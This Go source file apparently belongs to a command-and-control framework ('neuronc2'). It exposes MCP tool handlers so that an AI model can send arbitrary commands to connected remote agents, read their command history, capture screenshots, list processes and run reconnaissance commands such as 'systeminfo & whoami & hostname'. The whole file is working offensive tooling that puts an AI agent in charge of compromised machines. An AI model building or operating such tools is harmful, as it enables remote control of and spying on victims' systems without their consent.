package mcptools

import (
	"context"
	"fmt"
	"neuronc2/internal/utils"
	"time"

	"github.com/mark3labs/mcp-go/mcp"
)

func SendCommand(c2 ServerInterface) func(context.Context, mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		startTime := time.Now()

		agentID, ok := req.Params.Arguments["agent_id"].(string)
		if !ok {
			return utils.FormatJSONResponse("send_command", nil, fmt.Errorf("agent_id missing or invalid"), startTime)
		}
		command, ok := req.Params.Arguments["command"].(string)
		if !ok {
			return utils.FormatJSONResponse("send_command", nil, fmt.Errorf("command missing or invalid"), startTime)
		}

		agent, exists := c2.GetAgent(agentID)
		if !exists {
			return utils.FormatJSONResponse("send_command", nil, fmt.Errorf("agent %s not found or not connected", agentID), startTime)
		}

		err := agent.SendMessage([]byte(command))
		if err != nil {
			return utils.FormatJSONResponse("send_command", nil, fmt.Errorf("failed to send command: %v", err), startTime)
		}

		// Save command to history
		queries := c2.GetQueries()
		queries.SaveCommandHistory(agentID, command, "")

		// Wait for response
		timeout := time.After(c2.GetConfig().CommandTimeout)
		select {
		case response := <-agent.Response:
			// Update history with response
			queries.SaveCommandHistory(agentID, command, response)

			data := map[string]interface{}{
				"agent_id":       agentID,
				"command":        command,
				"output":         response,
				"execution_time": time.Since(startTime).String(),
			}

			return utils.FormatJSONResponse("send_command", data, nil, startTime)

		case <-timeout:
			data := map[string]interface{}{
				"agent_id": agentID,
				"command":  command,
				"status":   "timeout",
				"message":  "Command sent, but no response received within 30 seconds",
			}
			return utils.FormatJSONResponse("send_command", data, nil, startTime)

		case <-ctx.Done():
			return utils.FormatJSONResponse("send_command", nil, ctx.Err(), startTime)
		}
	}
}

func GetCommandHistory(c2 ServerInterface) func(context.Context, mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		startTime := time.Now()

		agentID, ok := req.Params.Arguments["agent_id"].(string)
		if !ok {
			return utils.FormatJSONResponse("get_command_history", nil, fmt.Errorf("agent_id parameter missing"), startTime)
		}

		limit := 50
		if l, ok := req.Params.Arguments["limit"].(float64); ok {
			limit = int(l)
		}

		queries := c2.GetQueries()
		history, err := queries.GetCommandHistory(agentID, limit)
		if err != nil {
			return utils.FormatJSONResponse("get_command_history", nil, err, startTime)
		}

		data := map[string]interface{}{
			"agent_id": agentID,
			"history":  history,
			"count":    len(history),
			"limit":    limit,
		}

		return utils.FormatJSONResponse("get_command_history", data, nil, startTime)
	}
}

func GetSystemInfo(c2 ServerInterface) func(context.Context, mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		agentID, ok := req.Params.Arguments["agent_id"].(string)
		if !ok {
			return utils.FormatJSONResponse("get_system_info", nil, fmt.Errorf("agent_id missing or invalid"), time.Now())
		}

		req.Params.Arguments = map[string]interface{}{
			"agent_id": agentID,
			"command":  "systeminfo & whoami & hostname & date /T & time /T",
		}
		return SendCommand(c2)(ctx, req)
	}
}

func CaptureScreen(c2 ServerInterface) func(context.Context, mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		agentID, ok := req.Params.Arguments["agent_id"].(string)
		if !ok {
			return utils.FormatJSONResponse("capture_screen", nil, fmt.Errorf("agent_id missing or invalid"), time.Now())
		}

		req.Params.Arguments = map[string]interface{}{
			"agent_id": agentID,
			"command":  "screenshot",
		}
		return SendCommand(c2)(ctx, req)
	}
}

func ListProcesses(c2 ServerInterface) func(context.Context, mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		agentID, ok := req.Params.Arguments["agent_id"].(string)
		if !ok {
			return utils.FormatJSONResponse("list_processes", nil, fmt.Errorf("agent_id missing or invalid"), time.Now())
		}

		req.Params.Arguments = map[string]interface{}{
			"agent_id": agentID,
			"command":  "tasklist",
		}
		return SendCommand(c2)(ctx, req)
	}
}
